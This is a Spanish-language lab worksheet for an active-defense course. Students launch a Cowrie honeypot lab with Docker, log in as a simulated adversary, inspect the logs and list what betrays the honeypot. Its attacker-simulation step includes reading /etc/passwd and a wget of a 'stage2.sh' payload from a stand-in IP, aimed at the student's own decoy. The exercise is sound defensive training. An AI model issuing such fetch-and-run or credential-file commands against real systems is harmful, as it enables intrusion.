Ejercicio E1

Armá tu laboratorio y rompelo

Levantás el laboratorio, entrás al honeypot como entraría un adversario y pasás los últimos diez minutos buscando qué lo delata. Todo lo que encuentres es el backlog de trabajo del E5.

Guardado
Objetivo

Dejar el laboratorio corriendo hoy y descubrir, tocándolo, por qué un honeypot recién instalado no engaña a nadie. Lo que anotes acá se arregla en el E5 y se pone a prueba en el E14.

Acá todo es falso

Cowrie es un sistema falso completo. No hay nada real adentro y ningún usuario de EkoFinance tiene motivo para llegar. Por eso detecta a cualquiera que lo toque, sin importar qué haga.

En el E3 vas a trabajar sobre lo contrario: el portal es real, tiene usuarios, y ahí el engaño es sólo lo que vos le agregás encima. Vas a hacer las dos cosas durante el curso, y la diferencia entre ellas es la mitad de las decisiones de diseño.

1 · Levantá el laboratorio

El laboratorio viene adentro de este mismo repositorio, en la carpeta mi-lab/. Si ya lo clonaste para leer estas guías, ya lo tenés: no hay que bajar nada más.

Terminal
# 1 · si todavía no lo clonaste
git clone https://github.com/Base4Security/eko2026-active-defense-labs

# 2 · parate en la carpeta del laboratorio
cd eko2026-active-defense-labs/mi-lab

# 3 · levantá los tres servicios
docker compose up -d --build
docker compose ps          # portal, cowrie y opencanary en "running"

# sin internet: docker load -i b4-lab-kit.tar
#   el .tar sale de github.com/Base4Security/eko2026-active-defense-labs/releases

Todos los comandos de esta ficha y de las que siguen se corren desde mi-lab/, salvo que diga otra cosa.

2 · Entrá como entraría un adversario

Cualquier contraseña funciona. Estás en un shell falso: enumerá como alguien que acaba de conseguir acceso y todavía no sabe dónde cayó.

Segunda terminal
ssh root@localhost -p 2222

# enumerá: ¿qué es esta máquina, quién la usa, a dónde llega?
uname -a
cat /etc/passwd
ls -la /home
wget http://198.51.100.10/stage2.sh    # no resuelve: importa el intento
exit

3 · Mirá lo que produjo

Telemetría
# crudo
docker compose logs --tail=40 cowrie

# JSON estructurado, un evento por línea
docker compose exec cowrie tail -20 var/log/cowrie/cowrie.json

# solo lo que importa (si tenés jq)
docker compose exec cowrie cat var/log/cowrie/cowrie.json | \
  jq -c 'select(.eventid|test("login|command")) | {eventid,src_ip,username,input}'

4 · Rompelo

Diez minutos buscando qué lo delata ante alguien atento. El honeypot está sin configurar y se cae rápido: banner, hostname, contenido del filesystem, comportamiento raro de un comando, fechas.

Por dónde empezar
ssh -v root@localhost -p 2222 2>&1 | grep -i "remote software"
docker inspect b4-cowrie --format '{{.Created}} · {{.Config.Image}}'

# y adentro del shell falso:
hostname ; uname -a ; ls -la /home ; last ; df -h ; ps aux

Una fila por delator. La columna de la derecha es la que vas a ejecutar en el E5.
